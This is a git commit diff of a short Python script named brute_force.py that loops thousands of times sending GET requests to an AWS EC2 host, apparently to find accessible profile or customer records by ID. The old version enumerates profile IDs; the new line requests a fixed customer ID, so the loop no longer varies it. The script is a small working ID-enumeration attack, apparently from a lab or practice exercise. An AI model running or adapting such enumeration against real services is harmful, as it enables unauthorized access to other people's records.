2d11801aa2890b1179146b554de18a887ac54e55
Cheryl Fernandes <73298909+cheryl1908@users.noreply.github.com>
2023-08-08 16:09:19 +0530

    brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -1,7 +1,7 @@
 import requests
 
 for i in range(1,5000):
-    URL=f"http://ec2-3-6-91-214.ap-south-1.compute.amazonaws.com/profile?id={i}"
+    URL=f"http://ec2-3-108-196-161.ap-south-1.compute.amazonaws.com/api/get-customer?id=1"
     r=requests.get(url=URL)
     if r.status_code==200:
         print(URL)
